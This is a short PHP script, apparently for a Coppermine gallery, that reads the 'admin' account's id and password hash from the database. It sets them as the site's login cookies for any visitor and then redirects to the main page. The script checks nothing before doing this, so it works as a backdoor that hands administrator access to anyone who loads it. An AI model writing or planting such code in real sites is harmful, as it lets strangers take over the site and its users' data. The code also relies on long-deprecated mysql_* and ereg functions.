<?php
    // suck in the $CONFIG in order to connect to the database

    require "../include/config.inc.php";

    // connect to the database

    $dbconn = @mysql_connect($CONFIG['dbserver'], $CONFIG['dbuser'],
                            $CONFIG['dbpass']);

    mysql_select_db($CONFIG['dbname']);

    $query = "SELECT user_id, user_name, user_password"
           . " FROM " . $CONFIG['TABLE_PREFIX'] . "users"
           . " WHERE user_name = 'admin'";

    $result = mysql_query($query);

    $row = mysql_fetch_assoc($result);
    $host = $_SERVER[HTTP_HOST];
    $path = ereg_replace('/admin/.*', '/index.php', $_SERVER[SCRIPT_URL]);


    setcookie("cpg11d_uid", $row[user_id],             0, "/", $host, 0);
    setcookie("cpg11d_pass", md5($row[user_password]), 0, "/", $host, 0);
    header("Location: http://$host$path");
?>
